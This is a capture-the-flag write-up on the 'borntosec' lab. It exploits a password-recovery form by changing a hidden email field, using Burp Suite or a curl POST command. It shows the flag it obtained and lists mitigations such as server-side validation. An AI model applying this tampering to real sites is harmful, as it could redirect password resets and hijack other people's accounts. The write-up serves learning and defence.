## Exploiting a Vulnerability via Hidden Email Input

### Vulnerability Description

Upon visiting a page to retrieve a password, it became apparent that no visible input fields were available for entering an email address or other information. However, inspecting the page's source code revealed the following:

```html
<form action="#" method="POST">
    <input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">
    <input type="submit" name="Submit" value="Submit">
</form>
```

This form includes a hidden input field with the name `mail` and a predefined value of `webmaster@borntosec.com`. When the "Submit" button is clicked, the form sends a POST request to the server containing the hidden email field.

### Exploitation Steps

#### 1. Analyzing the Request

Clicking "Submit" triggers a POST request to the server. This request includes the hidden `mail` field with its value set to `webmaster@borntosec.com`.

#### 2. Modifying the Request Using a Proxy (Burp Suite)

By using a tool like Burp Suite to intercept the POST request, the value of the `mail` field can be altered. For instance, modifying the request to:

```
mail=your_email@example.com
```

If the server does not perform additional validation (e.g., server-side validation), it may send the password or sensitive information to the specified email address.

#### 3. Executing the Exploit with `curl`

Alternatively, the exploit can be performed using a `curl` command as follows:

```bash
curl -X POST http://example.com/path_to_form \
     -d "mail=your_email@example.com" \
     -d "Submit=Submit"
```

Replace `http://example.com/path_to_form` with the actual URL of the form.

#### Outcome

After modifying the request, the server responded with the desired information. In this case, the flag was obtained:

```
The flag is: 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0
```

### Implications

This vulnerability arises due to a lack of server-side validation, allowing an attacker to manipulate client-supplied data. Key takeaways include:

- **Lack of Server-Side Validation:** The server assumes that the form's data is trustworthy. However, client-side data can be tampered with, making this assumption incorrect.
- **Potential Risk:** If sensitive information such as a password is sent via email, an attacker could intercept or redirect this information.

---

### Resolving the Vulnerability

To mitigate this type of vulnerability, the following measures should be implemented:

1. **Server-Side Validation:**
   - Ensure that the server verifies the email address belongs to a legitimate user before sending any sensitive information.
   - Do not rely on client-supplied data, such as hidden input fields, without proper validation.

2. **Eliminate Unnecessary Hidden Fields:**
   - Avoid transmitting sensitive information, such as email addresses, in hidden fields.
   - Use secure identifiers (e.g., server-generated tokens) instead of user-provided data.

3. **Implement Logging:**
   - Maintain logs of password recovery attempts to detect suspicious or malicious activities.



